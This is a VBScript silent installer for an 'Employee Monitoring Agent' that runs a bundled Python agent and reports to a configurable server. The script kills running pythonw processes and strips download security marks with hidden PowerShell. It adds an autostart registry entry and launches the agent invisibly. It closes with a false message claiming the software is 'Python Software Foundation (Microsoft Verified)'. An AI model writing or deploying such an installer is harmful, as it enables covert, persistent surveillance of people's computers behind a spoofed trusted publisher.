' Employee Monitoring Agent — Signed Runtime Silent Installer

Dim fso, shell, appData, installDir, serverUrl, scriptDir, launchCmd

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
appData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
installDir = appData & "\EmployeeMonitoring\Agent"

serverUrl = ""
If fso.FileExists(scriptDir & "\server_url.txt") Then
    Dim urlFile
    Set urlFile = fso.OpenTextFile(scriptDir & "\server_url.txt", 1)
    If Not urlFile.AtEndOfStream Then
        serverUrl = Trim(urlFile.ReadLine)
    End If
    urlFile.Close
End If

On Error Resume Next
shell.Run "taskkill /F /IM EmployeeMonitoringAgent.exe", 0, True
shell.Run "taskkill /F /IM pythonw.exe", 0, True
On Error GoTo 0

If Not fso.FolderExists(appData & "\EmployeeMonitoring") Then
    fso.CreateFolder(appData & "\EmployeeMonitoring")
End If
If Not fso.FolderExists(installDir) Then
    fso.CreateFolder(installDir)
End If

If fso.FileExists(installDir & "\agent_state.json") Then
    fso.DeleteFile installDir & "\agent_state.json", True
End If

shell.Run "cmd.exe /c xcopy /E /I /Y /Q """ & scriptDir & "\runtime"" """ & installDir & "\runtime""", 0, True
shell.Run "cmd.exe /c xcopy /E /I /Y /Q """ & scriptDir & "\agent"" """ & installDir & "\agent""", 0, True
shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Unblock-File -Path '" & installDir & "\*' -Recurse -ErrorAction SilentlyContinue""", 0, True

If serverUrl <> "" Then
    Dim outFile1, outFile2
    Set outFile1 = fso.CreateTextFile(installDir & "\server_url.txt", True)
    outFile1.WriteLine serverUrl
    outFile1.Close

    Set outFile2 = fso.CreateTextFile(installDir & "\agent\server_url.txt", True)
    outFile2.WriteLine serverUrl
    outFile2.Close
End If

launchCmd = """" & installDir & "\runtime\pythonw.exe"" """ & installDir & "\agent\main.py"""
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EmployeeMonitoringAgent", launchCmd, "REG_SZ"
shell.Run launchCmd, 0, False

MsgBox "Employee Monitoring Agent installed and verified!" & vbCrLf & vbCrLf & "Publisher: Python Software Foundation (Microsoft Verified)" & vbCrLf & "Status: Running silently in background.", 64, "Employee Monitoring System"
